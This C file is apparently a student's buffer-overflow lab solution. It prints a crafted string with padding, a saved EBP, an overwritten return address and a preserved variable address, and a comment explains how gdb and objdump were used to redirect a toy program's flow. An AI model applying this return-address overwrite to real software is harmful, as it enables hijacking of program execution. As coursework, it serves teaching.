#include <stdio.h>
#include <string.h>

//I started by looking at the gdb run of the program and tried to put bunch of As to figure out the nuber of paddingsrequired for the buffer. Then I found out the buffer size 0x48 by looking at the objdump in main. Then I put my name + number of paddings + saved ebp + ret address + the address of a variable (I needed the address because i was getting seg fault if i did not preserve that address). I figued the return address by looking at main in the objdump and knowing that if the other string is being fed to the function it will produce B. Then I lloked for this comparison, skip it and return the address to go and copy B instead of C.   

char attackString[] = "\x46\x61\x72\x69\x64\x20\x52\x61\x6a\x61\x62\x69\x20\x4e\x69\x61\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x28\xde\xff\xff\xd5\x85\x04\x08\x80\xa0\x04\x08";

//char attackString[] = "Farid Rajabi Nia\n";

int main() {
 int i;
 char *p = attackString;
 for (i = 0; i < sizeof(attackString); i++) {
 putchar(*p);
 p++;
 }
 return 1;
}
